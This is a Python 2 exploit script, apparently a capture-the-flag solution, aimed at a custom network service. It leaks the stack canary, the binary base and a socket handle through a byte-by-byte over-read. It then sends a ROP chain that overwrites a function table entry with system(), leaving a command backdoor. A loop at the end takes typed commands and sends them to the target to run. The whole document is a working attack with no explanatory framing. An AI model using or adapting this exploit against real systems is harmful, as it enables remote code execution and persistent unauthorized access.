#!/usr/bin/python

import struct
import os,sys
import telnetlib
import socket
import random
import string
import time
import base64
import ctypes


p32 = lambda x: struct.pack("<I",x)
p16 = lambda x: struct.pack("<H",x)
p64 = lambda x: struct.pack("<Q",x)
u64 = lambda x: struct.unpack("<Q",x)[0]

# Setup
ip=sys.argv[1]
port=int(sys.argv[2])


def readline(f, delim = "\n"):
	l = ""
	while not l.endswith(delim):
		l = l + f.recv(1)
	return l

def get_connection(ip,port):
	s=socket.socket()
	s.connect((ip,port))
	return s

def get_telnetlib(s):
	t = telnetlib.Telnet()
	t.sock = s
	return t

def senddata(payload, cmdid=0x66, recv=True):
	s = get_connection(ip,port)
	s.send("Hello\x00")
	r = s.recv(3)
	assert r == "Hi\x00"
	hdr = p16(len(payload)) + p16(cmdid)
	s.send(hdr)
	s.send(payload)
	if recv:
		d = ""
		while len(d) < len(payload)+1:
			d += s.recv(len(payload)+1 - len(d))
		return d

print "[*] Leaking 80 bytes of stack..."

known = ""
for i in xrange(80):
	payload = "A"*256 + known
	d = senddata(payload)
	known += d[-1]

cookie = u64(known[0:8])
ret = u64(known[24:32])
stack = u64(known[48:56])
sock = u64(known[64:72])
base = ret - 0x16F0



print "[*] Leaked cookie: %x" % cookie
print "[*] Leaked base: %x" % base
print "[*] Leaked stack: %x" % stack


# ROP Chain for setting up a backdoor and continuing
chain = [
	base + 0x11ab,   # pop rax ; ret 
	base + 0x1738,   # system, but this is smashed at runtime so we just repeat the gadget
	base + 0x11ab,   # pop rax ; ret
	base + 0x1738,   # system
	base + 0x1a03,   # pop rbx ; ret
	
	# Setup a system() backdoor
	base + 0x11000, # Functions list
	base + 0xbf0e ,  # mov qword ptr [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret
	0x41414141,  # pad
	0x41414141,  # pad
	0x41414141,  # pad
	0x41414141,  # pad
	0x41414141,  # rbx
	
	# And return to the loop with the right socket at sp + 0x20
	base + 0x1592, # Loop start
	0x41414141,  # pad
	0x41414141,  # pad
	0x41414141,  # pad
	0x41414141,  # pad
	sock, 	 # sp + 0x20 should contain the main socket
]


ropchain = "".join([p64(i) for i in chain])
payload = "".ljust(256, "X") + p64(cookie) + "A".ljust(16, "X") + ropchain
senddata(payload, recv=False)

# print "[*] Opening calc.exe in background"
senddata("START /B calc.exe" + "\x00", cmdid=0x00)

# print "[*] Opening notepad.exe in background"
senddata("START /B notepad.exe" + "\x00", cmdid=0x00)
# raw_input("BOOM")

quit = False
while not quit:
	cmd = raw_input("CMD> ").strip()
	if cmd == "quit":
		quit = True
	else:
		senddata(cmd + "\x00", cmdid=0x00)
		print "[*] Executed " + cmd

